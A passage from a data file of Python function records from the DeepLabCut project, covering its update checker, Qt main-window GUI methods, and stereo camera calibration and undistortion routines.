        msg = QtWidgets.QMessageBox(text=f'DeepLabCut is up-to-date')
        msg.exec_()
    else:
        if not is_latest and is_latest_plugin:
            text = f'DeepLabCut {latest_version} available'
            command = ('pip', 'install', '-U', 'deeplabcut')
        elif not is_latest_plugin and is_latest:
            text = f'DeepLabCut labeling plugin {latest_plugin_version} available'
            command = ('pip', 'install', '-U', 'napari-deeplabcut')
        else:
            text = f'DeepLabCut {latest_version}\nand labeling plugin {latest_plugin_version} available'
            command = ('pip', 'install', '-U', 'deeplabcut', 'napari-deeplabcut')
        msg = QtWidgets.QMessageBox(text=text)
        msg.setIcon(QtWidgets.QMessageBox.Information)
        update_btn = msg.addButton('Update', msg.AcceptRole)
        msg.setDefaultButton(update_btn)
        _ = msg.addButton('Skip', msg.RejectRole)
        msg.exec_()
        if msg.clickedButton() is update_btn:
            subprocess.check_call([sys.executable, '-m', *command])"
AlexEMG/DeepLabCut,__init__,"def __init__(self, app):
    super(MainWindow, self).__init__()
    self.app = app
    screen_size = app.screens()[0].size()
    self.screen_width = screen_size.width()
    self.screen_height = screen_size.height()
    self.logger = logging.getLogger('GUI')
    self.config = None
    self.loaded = False
    self.shuffle_value = 1
    self.trainingset_index = 0
    self.videotype = 'mp4'
    self.files = set()
    self.default_set()
    self._generate_welcome_page()
    self.window_set()
    self.default_set()
    names = ['new_project.png', 'open.png', 'help.png']
    self.create_actions(names)
    self.create_menu_bar()
    self.load_settings()
    self._toolbar = None
    self.create_toolbar()
    self.writer = StreamWriter()
    sys.stdout = self.writer
    self.receiver = StreamReceiver(self.writer.queue)
    self.receiver.new_text.connect(self.print_to_status_bar)
    self._progress_bar = QtWidgets.QProgressBar()
    self._progress_bar.setMaximum(0)
    self._progress_bar.hide()
    self.status_bar.addPermanentWidget(self._progress_bar)"
AlexEMG/DeepLabCut,print_to_status_bar,"def print_to_status_bar(self, text):
    self.status_bar.showMessage(text)
    self.status_bar.repaint()"
AlexEMG/DeepLabCut,toolbar,"@property
def toolbar(self):
    if self._toolbar is None:
        self._toolbar = self.addToolBar('File')
    return self._toolbar"
AlexEMG/DeepLabCut,settings,"@cached_property
def settings(self):
    return QtCore.QSettings()"
AlexEMG/DeepLabCut,load_settings,"def load_settings(self):
    filenames = self.settings.value('recent_files') or []
    for filename in filenames:
        self.add_recent_filename(filename)"
AlexEMG/DeepLabCut,save_settings,"def save_settings(self):
    recent_files = []
    for action in self.recentfiles_menu.actions()[::-1]:
        recent_files.append(action.text())
    self.settings.setValue('recent_files', recent_files)"
AlexEMG/DeepLabCut,add_recent_filename,"def add_recent_filename(self, filename):
    actions = self.recentfiles_menu.actions()
    filenames = [action.text() for action in actions]
    if filename in filenames:
        return
    action = QAction(filename, self)
    before_action = actions[0] if actions else None
    self.recentfiles_menu.insertAction(before_action, action)"
AlexEMG/DeepLabCut,cfg,"@property
def cfg(self):
    try:
        cfg = auxiliaryfunctions.read_config(self.config)
    except TypeError:
        cfg = {}
    return cfg"
AlexEMG/DeepLabCut,project_folder,"@property
def project_folder(self) -> str:
    return self.cfg.get('project_path', os.path.expanduser('~/Desktop'))"
AlexEMG/DeepLabCut,is_multianimal,"@property
def is_multianimal(self) -> bool:
    return bool(self.cfg.get('multianimalproject'))"
AlexEMG/DeepLabCut,all_bodyparts,"@property
def all_bodyparts(self) -> List:
    if self.is_multianimal:
        return self.cfg.get('multianimalbodyparts')
    else:
        return self.cfg['bodyparts']"
AlexEMG/DeepLabCut,all_individuals,"@property
def all_individuals(self) -> List:
    if self.is_multianimal:
        return self.cfg.get('individuals')
    else:
        return ['']"
AlexEMG/DeepLabCut,pose_cfg_path,"@property
def pose_cfg_path(self) -> str:
    try:
        return os.path.join(self.cfg['project_path'], auxiliaryfunctions.get_model_folder(self.cfg['TrainingFraction'][int(self.trainingset_index)], int(self.shuffle_value), self.cfg), 'train', 'pose_cfg.yaml')
    except FileNotFoundError:
        return str(Path(deeplabcut.__file__).parent / 'pose_cfg.yaml')"
AlexEMG/DeepLabCut,inference_cfg_path,"@property
def inference_cfg_path(self) -> str:
    return os.path.join(self.cfg['project_path'], auxiliaryfunctions.get_model_folder(self.cfg['TrainingFraction'][int(self.trainingset_index)], int(self.shuffle_value), self.cfg), 'test', 'inference_cfg.yaml')"
AlexEMG/DeepLabCut,update_cfg,"def update_cfg(self, text):
    self.root.config = text
    self.unsupervised_id_tracking.setEnabled(self.is_transreid_available())"
AlexEMG/DeepLabCut,update_shuffle,"def update_shuffle(self, value):
    self.shuffle_value = value
    self.logger.info(f'Shuffle set to {self.shuffle_value}')"
AlexEMG/DeepLabCut,video_type,"@property
def video_type(self):
    return self.videotype"
AlexEMG/DeepLabCut,video_type,"@video_type.setter
def video_type(self, ext):
    self.videotype = ext
    self.video_type_.emit(ext)
    self.logger.info(f'Video type set to {self.video_type}')"
AlexEMG/DeepLabCut,video_files,"@property
def video_files(self):
    return self.files"
AlexEMG/DeepLabCut,video_files,"@video_files.setter
def video_files(self, video_files):
    self.files = set(video_files)
    self.video_files_.emit(self.files)
    self.logger.info(f'Videos selected to analyze:\n{self.files}')"
AlexEMG/DeepLabCut,window_set,"def window_set(self):
    self.setWindowTitle('DeepLabCut')
    palette = QtGui.QPalette()
    palette.setColor(QtGui.QPalette.Window, QtGui.QColor('#ffffff'))
    self.setPalette(palette)
    icon = os.path.join(BASE_DIR, 'assets', 'logo.png')
    self.setWindowIcon(QIcon(icon))
    self.status_bar = self.statusBar()
    self.status_bar.setObjectName('Status Bar')
    self.status_bar.showMessage('www.deeplabcut.org')"
AlexEMG/DeepLabCut,_generate_welcome_page,"def _generate_welcome_page(self):
    self.layout = QtWidgets.QVBoxLayout()
    self.layout.setAlignment(Qt.AlignCenter | Qt.AlignTop)
    self.layout.setSpacing(30)
    title = components._create_label_widget(f'Welcome to the DeepLabCut Project Manager GUI {VERSION}!', 'font:bold; font-size:18px;', margins=(0, 30, 0, 0))
    title.setAlignment(Qt.AlignCenter)
    self.layout.addWidget(title)
    image_widget = QtWidgets.QLabel(self)
    image_widget.setAlignment(Qt.AlignCenter)
    image_widget.setContentsMargins(0, 0, 0, 0)
    logo = os.path.join(BASE_DIR, 'assets', 'logo_transparent.png')
    pixmap = QtGui.QPixmap(logo)
    image_widget.setPixmap(pixmap.scaledToHeight(400, QtCore.Qt.SmoothTransformation))
    self.layout.addWidget(image_widget)
    description = 'DeepLabCut™ is an open source tool for markerless pose estimation of user-defined body parts with deep learning.\nA.  and M.W.  Mathis Labs | http://www.deeplabcut.org\n\n To get started,  create a new project, load an existing one, or try one of our pretrained models from the Model Zoo.'
    label = components._create_label_widget(description, 'font-size:12px; text-align: center;', margins=(0, 0, 0, 0))
    label.setMinimumWidth(400)
    label.setWordWrap(True)
    label.setAlignment(Qt.AlignCenter)
    self.layout.addWidget(label)
    self.layout_buttons = QtWidgets.QHBoxLayout()
    self.layout_buttons.setAlignment(Qt.AlignCenter | Qt.AlignCenter)
    self.create_project_button = QtWidgets.QPushButton('Create New Project')
    self.create_project_button.setFixedWidth(200)
    self.create_project_button.clicked.connect(self._create_project)
    self.load_project_button = QtWidgets.QPushButton('Load Project')
    self.load_project_button.setFixedWidth(200)
    self.load_project_button.clicked.connect(self._open_project)
    self.run_superanimal_button = QtWidgets.QPushButton('Model Zoo')
    self.run_superanimal_button.setFixedWidth(200)
    self.run_superanimal_button.clicked.connect(self._goto_superanimal)
    self.layout_buttons.addWidget(self.create_project_button)
    self.layout_buttons.addWidget(self.load_project_button)
    self.layout_buttons.addWidget(self.run_superanimal_button)
    self.layout.addLayout(self.layout_buttons)
    widget = QWidget()
    widget.setLayout(self.layout)
    self.setCentralWidget(widget)"
AlexEMG/DeepLabCut,default_set,"def default_set(self):
    self.name_default = ''
    self.proj_default = ''
    self.exp_default = ''
    self.loc_default = str(Path.home())"
AlexEMG/DeepLabCut,create_actions,"def create_actions(self, names):
    self.newAction = QAction(self)
    self.newAction.setText('&New Project...')
    self.newAction.setIcon(QIcon(os.path.join(BASE_DIR, 'assets', 'icons', names[0])))
    self.newAction.setShortcut('Ctrl+N')
    self.newAction.setStatusTip('Create a new project...')
    self.newAction.triggered.connect(self._create_project)
    self.openAction = QAction('&Open...', self)
    self.openAction.setIcon(QIcon(os.path.join(BASE_DIR, 'assets', 'icons', names[1])))
    self.openAction.setShortcut('Ctrl+O')
    self.openAction.setStatusTip('Open a project...')
    self.openAction.triggered.connect(self._open_project)
    self.saveAction = QAction('&Save', self)
    self.exitAction = QAction('&Exit', self)
    self.lightmodeAction = QAction('&Light theme', self)
    self.lightmodeAction.triggered.connect(self.lightmode)
    self.darkmodeAction = QAction('&Dark theme', self)
    self.darkmodeAction.triggered.connect(self.darkmode)
    self.helpAction = QAction('&Help', self)
    self.helpAction.setIcon(QIcon(os.path.join(BASE_DIR, 'assets', 'icons', names[2])))
    self.helpAction.setStatusTip('Ask for help...')
    self.helpAction.triggered.connect(self._ask_for_help)
    self.aboutAction = QAction('&Learn DLC', self)
    self.aboutAction.triggered.connect(self._learn_dlc)
    self.check_updates = QAction('&Check for Updates...', self)
    self.check_updates.triggered.connect(_check_for_updates)"
AlexEMG/DeepLabCut,create_menu_bar,"def create_menu_bar(self):
    menu_bar = self.menuBar()
    self.file_menu = QMenu('&File', self)
    menu_bar.addMenu(self.file_menu)
    self.file_menu.addAction(self.newAction)
    self.file_menu.addAction(self.openAction)
    self.recentfiles_menu = self.file_menu.addMenu('Open Recent')
    self.recentfiles_menu.triggered.connect(lambda a: self._update_project_state(a.text(), True))
    self.file_menu.addAction(self.saveAction)
    self.file_menu.addAction(self.exitAction)
    view_menu = QMenu('&View', self)
    mode = view_menu.addMenu('Appearance')
    menu_bar.addMenu(view_menu)
    mode.addAction(self.lightmodeAction)
    mode.addAction(self.darkmodeAction)
    help_menu = QMenu('&Help', self)
    menu_bar.addMenu(help_menu)
    help_menu.addAction(self.helpAction)
    help_menu.adjustSize()
    help_menu.addAction(self.check_updates)
    help_menu.addAction(self.aboutAction)"
AlexEMG/DeepLabCut,update_menu_bar,"def update_menu_bar(self):
    self.file_menu.removeAction(self.newAction)
    self.file_menu.removeAction(self.openAction)"
AlexEMG/DeepLabCut,create_toolbar,"def create_toolbar(self):
    self.toolbar.addAction(self.newAction)
    self.toolbar.addAction(self.openAction)
    self.toolbar.addAction(self.helpAction)"
AlexEMG/DeepLabCut,remove_action,"def remove_action(self):
    self.toolbar.removeAction(self.newAction)
    self.toolbar.removeAction(self.openAction)
    self.toolbar.removeAction(self.helpAction)"
AlexEMG/DeepLabCut,_update_project_state,"def _update_project_state(self, config, loaded):
    self.config = config
    self.loaded = loaded
    if loaded:
        self.add_recent_filename(self.config)
        self.add_tabs()"
AlexEMG/DeepLabCut,_ask_for_help,"def _ask_for_help(self):
    dlg = QMessageBox(self)
    dlg.setWindowTitle('Ask for help')
    dlg.setText(""Ask our community for help on <a href='https://forum.image.sc/tag/deeplabcut'>the forum</a>!"")
    _ = dlg.exec()"
AlexEMG/DeepLabCut,_learn_dlc,"def _learn_dlc(self):
    dlg = QMessageBox(self)
    dlg.setWindowTitle('Learn DLC')
    dlg.setText(""Learn DLC with <a href='https://deeplabcut.github.io/DeepLabCut/docs/UseOverviewGuide.html'>our docs and how-to guides</a>!"")
    _ = dlg.exec()"
AlexEMG/DeepLabCut,_create_project,"def _create_project(self):
    dlg = ProjectCreator(self)
    dlg.show()"
AlexEMG/DeepLabCut,_open_project,"def _open_project(self):
    open_project = OpenProject(self)
    open_project.load_config()
    if not open_project.config:
        return
    open_project.loaded = True
    self._update_project_state(open_project.config, open_project.loaded)"
AlexEMG/DeepLabCut,_goto_superanimal,"def _goto_superanimal(self):
    self.tab_widget = QtWidgets.QTabWidget()
    self.tab_widget.setContentsMargins(0, 20, 0, 0)
    self.modelzoo = ModelZoo(root=self, parent=None, h1_description='DeepLabCut - Model Zoo')
    self.tab_widget.addTab(self.modelzoo, 'Model Zoo')
    self.setCentralWidget(self.tab_widget)"
AlexEMG/DeepLabCut,load_config,"def load_config(self, config):
    self.config = config
    self.config_loaded.emit()
    print(f'''Project ""{self.cfg['Task']}"" successfully loaded.''')"
AlexEMG/DeepLabCut,darkmode,"def darkmode(self):
    dark_stylesheet = qdarkstyle.load_stylesheet_pyside2()
    self.app.setStyleSheet(dark_stylesheet)
    names = ['new_project2.png', 'open2.png', 'help2.png']
    self.remove_action()
    self.create_actions(names)
    self.update_menu_bar()
    self.create_toolbar()"
AlexEMG/DeepLabCut,lightmode,"def lightmode(self):
    from qdarkstyle.light.palette import LightPalette
    style = qdarkstyle.load_stylesheet(palette=LightPalette)
    self.app.setStyleSheet(style)
    names = ['new_project.png', 'open.png', 'help.png']
    self.remove_action()
    self.create_actions(names)
    self.create_toolbar()
    self.update_menu_bar()"
AlexEMG/DeepLabCut,add_tabs,"def add_tabs(self):
    self.tab_widget = QtWidgets.QTabWidget()
    self.tab_widget.setContentsMargins(0, 20, 0, 0)
    self.manage_project = ManageProject(root=self, parent=None, h1_description='DeepLabCut - Manage Project')
    self.extract_frames = ExtractFrames(root=self, parent=None, h1_description='DeepLabCut - Extract Frames')
    self.label_frames = LabelFrames(root=self, parent=None, h1_description='DeepLabCut - Label Frames')
    self.create_training_dataset = CreateTrainingDataset(root=self, parent=None, h1_description='DeepLabCut - Step 4. Create training dataset')
    self.train_network = TrainNetwork(root=self, parent=None, h1_description='DeepLabCut - Train network')
    self.evaluate_network = EvaluateNetwork(root=self, parent=None, h1_description='DeepLabCut - Evaluate Network')
    self.analyze_videos = AnalyzeVideos(root=self, parent=None, h1_description='DeepLabCut - Analyze Videos')
    self.unsupervised_id_tracking = UnsupervizedIdTracking(root=self, parent=None, h1_description='DeepLabCut - Optional Unsupervised ID Tracking with Transformer')
    self.create_videos = CreateVideos(root=self, parent=None, h1_description='DeepLabCut - Create Videos')
    self.extract_outlier_frames = ExtractOutlierFrames(root=self, parent=None, h1_description='DeepLabCut - Step 8. Extract outlier frames')
    self.refine_tracklets = RefineTracklets(root=self, parent=None, h1_description='DeepLabCut - Refine labels')
    self.modelzoo = ModelZoo(root=self, parent=None, h1_description='DeepLabCut - Model Zoo')
    self.video_editor = VideoEditor(root=self, parent=None, h1_description='DeepLabCut - Optional Video Editor')
    self.tab_widget.addTab(self.manage_project, 'Manage project')
    self.tab_widget.addTab(self.extract_frames, 'Extract frames')
    self.tab_widget.addTab(self.label_frames, 'Label frames')
    self.tab_widget.addTab(self.create_training_dataset, 'Create training dataset')
    self.tab_widget.addTab(self.train_network, 'Train network')
    self.tab_widget.addTab(self.evaluate_network, 'Evaluate network')
    self.tab_widget.addTab(self.analyze_videos, 'Analyze videos')
    self.tab_widget.addTab(self.unsupervised_id_tracking, 'Unsupervised ID Tracking (*)')
    self.tab_widget.addTab(self.create_videos, 'Create videos')
    self.tab_widget.addTab(self.extract_outlier_frames, 'Extract outlier frames (*)')
    self.tab_widget.addTab(self.refine_tracklets, 'Refine tracklets (*)')
    self.tab_widget.addTab(self.modelzoo, 'Model Zoo')
    self.tab_widget.addTab(self.video_editor, 'Video editor (*)')
    if not self.is_multianimal:
        self.refine_tracklets.setEnabled(False)
    self.unsupervised_id_tracking.setEnabled(self.is_transreid_available())
    self.setCentralWidget(self.tab_widget)
    self.tab_widget.currentChanged.connect(self.refresh_active_tab)"
AlexEMG/DeepLabCut,refresh_active_tab,"def refresh_active_tab(self):
    active_tab = self.tab_widget.currentWidget()
    tab_label = self.tab_widget.tabText(self.tab_widget.currentIndex())
    widget_to_attribute_map = {QtWidgets.QSpinBox: 'setValue', components.ShuffleSpinBox: 'setValue', components.TrainingSetSpinBox: 'setValue', QtWidgets.QLineEdit: 'setText'}

    def _attempt_attribute_update(widget_name, updated_value):
        try:
            widget = getattr(active_tab, widget_name)
            method = getattr(widget, widget_to_attribute_map[type(widget)])
            self.logger.debug(f""Setting {widget_name}={updated_value} in tab '{tab_label}'"")
            method(updated_value)
        except AttributeError:
            pass
    _attempt_attribute_update('shuffle', self.shuffle_value)
    _attempt_attribute_update('cfg_line', self.config)"
AlexEMG/DeepLabCut,is_transreid_available,"def is_transreid_available(self):
    if self.is_multianimal:
        try:
            from deeplabcut.pose_tracking_pytorch import transformer_reID
            return True
        except ModuleNotFoundError:
            return False
    else:
        return False"
AlexEMG/DeepLabCut,closeEvent,"def closeEvent(self, event):
    print('Exiting...')
    answer = QtWidgets.QMessageBox.question(self, 'Quit', 'Are you sure you want to quit?', QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.Cancel, QtWidgets.QMessageBox.Cancel)
    if answer == QtWidgets.QMessageBox.Yes:
        self.receiver.terminate()
        event.accept()
        self.save_settings()
    else:
        event.ignore()
        print('')"
AlexEMG/DeepLabCut,_attempt_attribute_update,"def _attempt_attribute_update(widget_name, updated_value):
    try:
        widget = getattr(active_tab, widget_name)
        method = getattr(widget, widget_to_attribute_map[type(widget)])
        self.logger.debug(f""Setting {widget_name}={updated_value} in tab '{tab_label}'"")
        method(updated_value)
    except AttributeError:
        pass"
AlexEMG/DeepLabCut,parse_available_supermodels,"def parse_available_supermodels():
    import deeplabcut
    dlc_path = deeplabcut.utils.auxiliaryfunctions.get_deeplabcut_path()
    json_path = os.path.join(dlc_path, 'modelzoo', 'models.json')
    with open(json_path) as file:
        return json.load(file)"
AlexEMG/DeepLabCut,calibrate_cameras,"def calibrate_cameras(config, cbrow=8, cbcol=6, calibrate=False, alpha=0.4, search_window_size=(11, 11)):
    """"""This function extracts the corners points from the calibration images, calibrates the camera and stores the calibration files in the project folder (defined in the config file).

    Make sure you have around 20-60 pairs of calibration images. The function should be used iteratively to select the right set of calibration images.

    A pair of calibration image is considered ""correct"", if the corners are detected correctly in both the images. It may happen that during the first run of this function,
    the extracted corners are incorrect or the order of detected corners does not align for the corresponding views (i.e. camera-1 and camera-2 images).

    In such a case, remove those pairs of images and re-run this function. Once the right number of calibration images are selected,
    use the parameter ``calibrate=True`` to calibrate the cameras.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    cbrow : int
        Integer specifying the number of rows in the calibration image.

    cbcol : int
        Integer specifying the number of columns in the calibration image.

    calibrate : bool
        If this is set to True, the cameras are calibrated with the current set of calibration images. The default is ``False``
        Set it to True, only after checking the results of the corner detection method and removing dysfunctional images!

    alpha: float
        Floating point number between 0 and 1 specifying the free scaling parameter. When alpha = 0, the rectified images with only valid pixels are stored
        i.e. the rectified images are zoomed in. When alpha = 1, all the pixels from the original images are retained.
        For more details: https://docs.opencv.org/2.4/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html

    search_window_size: tuple of int
        Half of the side length of the search window when refining detected checkerboard corners for subpixel accuracy.

    Example
    --------
    Linux/MacOs/Windows
    >>> deeplabcut.calibrate_camera(config)

    Once the right set of calibration images are selected,
    >>> deeplabcut.calibrate_camera(config,calibrate=True)

    """"""
    criteria = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, 30, 0.001)
    objp = np.zeros((cbrow * cbcol, 3), np.float32)
    objp[:, :2] = np.mgrid[0:cbcol, 0:cbrow].T.reshape(-1, 2)
    cfg_3d = auxiliaryfunctions.read_config(config)
    (img_path, path_corners, path_camera_matrix, path_undistort, path_removed_images) = auxiliaryfunctions_3d.Foldernames3Dproject(cfg_3d)
    images = glob.glob(os.path.join(img_path, '*.jpg'))
    cam_names = cfg_3d['camera_names']
    try:
        for i in range(len(cam_names)):
            cfg_3d[str('config_file_' + cam_names[i])] = cfg_3d.pop(str('config_file_camera-' + str(i + 1)))
        for i in range(len(cam_names)):
            cfg_3d[str('shuffle_' + cam_names[i])] = cfg_3d.pop(str('shuffle_camera-' + str(i + 1)))
    except:
        pass
    project_path = cfg_3d['project_path']
    projconfigfile = os.path.join(str(project_path), 'config.yaml')
    auxiliaryfunctions.write_config_3d(projconfigfile, cfg_3d)
    img_shape = {}
    objpoints = {}
    imgpoints = {}
    dist_pickle = {}
    stereo_params = {}
    for cam in cam_names:
        objpoints.setdefault(cam, [])
        imgpoints.setdefault(cam, [])
        dist_pickle.setdefault(cam, [])
    images.sort(key=lambda f: int(''.join(filter(str.isdigit, f))))
    if len(images) == 0:
        raise Exception('No calibration images found. Make sure the calibration images are saved as .jpg and with prefix as the camera name as specified in the config.yaml file.')
    skip_images = []
    for fname in images:
        for cam in cam_names:
            if cam in fname and Path(fname).name not in skip_images:
                filename = Path(fname).stem
                img = cv2.imread(fname)
                gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
                (ret, corners) = cv2.findChessboardCorners(gray, (cbcol, cbrow), None)
                if ret == True:
                    img_shape[cam] = gray.shape[::-1]
                    objpoints[cam].append(objp)
                    corners = cv2.cornerSubPix(gray, corners, search_window_size, (-1, -1), criteria)
                    imgpoints[cam].append(corners)
                    img = cv2.drawChessboardCorners(img, (cbcol, cbrow), corners, ret)
                    cv2.imwrite(os.path.join(str(path_corners), filename + '_corner.jpg'), img)
                else:
                    print('Corners not found for the image %s' % Path(fname).name)
                    for new_cam in cam_names:
                        remove_fname = Path(fname).name.replace(cam, new_cam)
                        os.rename(os.path.join(str(img_path), remove_fname), os.path.join(str(path_removed_images), remove_fname))
                        if new_cam != cam:
                            skip_images.append(remove_fname)
    try:
        (h, w) = img.shape[:2]
    except:
        raise Exception('It seems that the name of calibration images does not match with the camera names in the config file. Please make sure that the calibration images are named with camera names as specified in the config.yaml file.')
    if calibrate == True:
        for cam in cam_names:
            (ret, mtx, dist, rvecs, tvecs) = cv2.calibrateCamera(objpoints[cam], imgpoints[cam], img_shape[cam], None, None)
            dist_pickle[cam] = {'mtx': mtx, 'dist': dist, 'objpoints': objpoints[cam], 'imgpoints': imgpoints[cam]}
            pickle.dump(dist_pickle, open(os.path.join(path_camera_matrix, cam + '_intrinsic_params.pickle'), 'wb'))
            print('Saving intrinsic camera calibration matrices for %s as a pickle file in %s' % (cam, os.path.join(path_camera_matrix)))
            mean_error = 0
            for i in range(len(objpoints[cam])):
                (imgpoints_proj, _) = cv2.projectPoints(objpoints[cam][i], rvecs[i], tvecs[i], mtx, dist)
                error = cv2.norm(imgpoints[cam][i], imgpoints_proj, cv2.NORM_L2) / len(imgpoints_proj)
                mean_error += error
            print('Mean re-projection error for %s images: %.3f pixels ' % (cam, mean_error / len(objpoints[cam])))
        camera_pair = [[cam_names[0], cam_names[1]]]
        for pair in camera_pair:
            print('Computing stereo calibration for ' % pair)
            (retval, cameraMatrix1, distCoeffs1, cameraMatrix2, distCoeffs2, R, T, E, F) = cv2.stereoCalibrate(objpoints[pair[0]], imgpoints[pair[0]], imgpoints[pair[1]], dist_pickle[pair[0]]['mtx'], dist_pickle[pair[0]]['dist'], dist_pickle[pair[1]]['mtx'], dist_pickle[pair[1]]['dist'], (h, w), flags=cv2.CALIB_FIX_INTRINSIC)
            rectify_scale = alpha
            (R1, R2, P1, P2, Q, roi1, roi2) = cv2.stereoRectify(cameraMatrix1, distCoeffs1, cameraMatrix2, distCoeffs2, (h, w), R, T, alpha=rectify_scale)
            stereo_params[pair[0] + '-' + pair[1]] = {'cameraMatrix1': cameraMatrix1, 'cameraMatrix2': cameraMatrix2, 'distCoeffs1': distCoeffs1, 'distCoeffs2': distCoeffs2, 'R': R, 'T': T, 'E': E, 'F': F, 'R1': R1, 'R2': R2, 'P1': P1, 'P2': P2, 'roi1': roi1, 'roi2': roi2, 'Q': Q, 'image_shape': [img_shape[pair[0]], img_shape[pair[1]]]}
        print('Saving the stereo parameters for every pair of cameras as a pickle file in %s' % str(os.path.join(path_camera_matrix)))
        auxiliaryfunctions.write_pickle(os.path.join(path_camera_matrix, 'stereo_params.pickle'), stereo_params)
        print('Camera calibration done! Use the function ``check_undistortion`` to check the check the calibration')
    else:
        print('Corners extracted! You may check for the extracted corners in the directory %s and remove the pair of images where the corners are incorrectly detected. If all the corners are detected correctly with right order, then re-run the same function and use the flag ``calibrate=True``, to calbrate the camera.' % str(path_corners))"
AlexEMG/DeepLabCut,check_undistortion,"def check_undistortion(config, cbrow=8, cbcol=6, plot=True):
    """"""
    This function undistorts the calibration images based on the camera matrices and stores them in the project folder(defined in the config file)
    to visually check if the camera matrices are correct.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    cbrow : int
        Int specifying the number of rows in the calibration image.

    cbcol : int
        Int specifying the number of columns in the calibration image.

    plot : bool
        If this is set to True, the results of undistortion are saved as plots. The default is ``True``; if provided it must be either ``True`` or ``False``.

    Example
    --------
    Linux/MacOs/Windows
    >>> deeplabcut.check_undistortion(config, cbrow = 8,cbcol = 6)

    """"""
    criteria = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, 30, 0.001)
    cfg_3d = auxiliaryfunctions.read_config(config)
    (img_path, path_corners, path_camera_matrix, path_undistort, path_removed_images) = auxiliaryfunctions_3d.Foldernames3Dproject(cfg_3d)
    markerSize = cfg_3d['dotsize']
    alphaValue = cfg_3d['alphaValue']
    markerType = cfg_3d['markerType']
    markerColor = cfg_3d['markerColor']
    cam_names = cfg_3d['camera_names']
    images = glob.glob(os.path.join(img_path, '*.jpg'))
    images.sort(key=lambda f: int(''.join(filter(str.isdigit, f))))
    '\n    for fname in images:\n        for cam in cam_names:\n            if cam in fname:\n                filename = Path(fname).stem\n                ext = Path(fname).suffix\n                img = cv2.imread(fname)\n                gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)\n    '
    camera_pair = [[cam_names[0], cam_names[1]]]
    stereo_params = auxiliaryfunctions.read_pickle(os.path.join(path_camera_matrix, 'stereo_params.pickle'))
    for pair in camera_pair:
        (map1_x, map1_y) = cv2.initUndistortRectifyMap(stereo_params[pair[0] + '-' + pair[1]]['cameraMatrix1'], stereo_params[pair[0] + '-' + pair[1]]['distCoeffs1'], stereo_params[pair[0] + '-' + pair[1]]['R1'], stereo_params[pair[0] + '-' + pair[1]]['P1'], stereo_params[pair[0] + '-' + pair[1]]['image_shape'][0], cv2.CV_16SC2)
        (map2_x, map2_y) = cv2.initUndistortRectifyMap(stereo_params[pair[0] + '-' + pair[1]]['cameraMatrix2'], stereo_params[pair[0] + '-' + pair[1]]['distCoeffs2'], stereo_params[pair[0] + '-' + pair[1]]['R2'], stereo_params[pair[0] + '-' + pair[1]]['P2'], stereo_params[pair[0] + '-' + pair[1]]['image_shape'][1], cv2.CV_16SC2)
        cam1_undistort = []
        cam2_undistort = []
        for fname in images:
            if pair[0] in fname:
                filename = Path(fname).stem
                img1 = cv2.imread(fname)
                gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY)
                (h, w) = img1.shape[:2]
                (_, corners1) = cv2.findChessboardCorners(gray1, (cbcol, cbrow), None)
                corners_origin1 = cv2.cornerSubPix(gray1, corners1, (11, 11), (-1, -1), criteria)
                im_remapped1 = cv2.remap(img1, map1_x, map1_y, cv2.INTER_LANCZOS4)
                imgpoints_proj_undistort = cv2.undistortPoints(src=corners_origin1, cameraMatrix=stereo_params[pair[0] + '-' + pair[1]]['cameraMatrix1'], distCoeffs=stereo_params[pair[0] + '-' + pair[1]]['distCoeffs1'], P=stereo_params[pair[0] + '-' + pair[1]]['P1'], R=stereo_params[pair[0] + '-' + pair[1]]['R1'])
                cam1_undistort.append(imgpoints_proj_undistort)
                cv2.imwrite(os.path.join(str(path_undistort), filename + '_undistort.jpg'), im_remapped1)
                imgpoints_proj_undistort = []
            elif pair[1] in fname:
                filename = Path(fname).stem
                img2 = cv2.imread(fname)
                gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY)
                (h, w) = img2.shape[:2]
                (_, corners2) = cv2.findChessboardCorners(gray2, (cbcol, cbrow), None)
                corners_origin2 = cv2.cornerSubPix(gray2, corners2, (11, 11), (-1, -1), criteria)
                im_remapped2 = cv2.remap(img2, map2_x, map2_y, cv2.INTER_LANCZOS4)
                imgpoints_proj_undistort2 = cv2.undistortPoints(src=corners_origin2, cameraMatrix=stereo_params[pair[0] + '-' + pair[1]]['cameraMatrix2'], distCoeffs=stereo_params[pair[0] + '-' + pair[1]]['distCoeffs2'], P=stereo_params[pair[0] + '-' + pair[1]]['P2'], R=stereo_params[pair[0] + '-' + pair[1]]['R2'])
                cam2_undistort.append(imgpoints_proj_undistort2)
                cv2.imwrite(os.path.join(str(path_undistort), filename + '_undistort.jpg'), im_remapped2)
                imgpoints_proj_undistort2 = []
        cam1_undistort = np.array(cam1_undistort)
        cam2_undistort = np.array(cam2_undistort)
        print('All images are undistorted and stored in %s' % str(path_undistort))
        print('Use the function ``triangulate`` to undistort the dataframes and compute the triangulation')
        if plot == True:
            (f1, (ax1, ax2)) = plt.subplots(1, 2, figsize=(20, 10))
            f1.suptitle(str('Original Image: Views from ' + pair[0] + ' and ' + pair[1]), fontsize=25)
            ax1.imshow(cv2.cvtColor(img1, cv2.COLOR_BGR2RGB))
            ax2.imshow(cv2.cvtColor(img2, cv2.COLOR_BGR2RGB))
            norm = mcolors.Normalize(vmin=0.0, vmax=cam1_undistort.shape[1])
            plt.savefig(os.path.join(str(path_undistort), 'Original_Image.png'))
            (f2, (ax1, ax2)) = plt.subplots(1, 2, figsize=(20, 10))
            f2.suptitle('Undistorted corner points on camera-1 and camera-2', fontsize=25)
            ax1.imshow(cv2.cvtColor(im_remapped1, cv2.COLOR_BGR2RGB))
            ax2.imshow(cv2.cvtColor(im_remapped2, cv2.COLOR_BGR2RGB))
            for i in range(0, cam1_undistort.shape[1]):
                ax1.scatter([cam1_undistort[-1][i, 0, 0]], [cam1_undistort[-1][i, 0, 1]], marker=markerType, s=markerSize, color=markerColor, alpha=alphaValue)
                ax2.scatter([cam2_undistort[-1][i, 0, 0]], [cam2_undistort[-1][i, 0, 1]], marker=markerType, s=markerSize, color=markerColor, alpha=alphaValue)
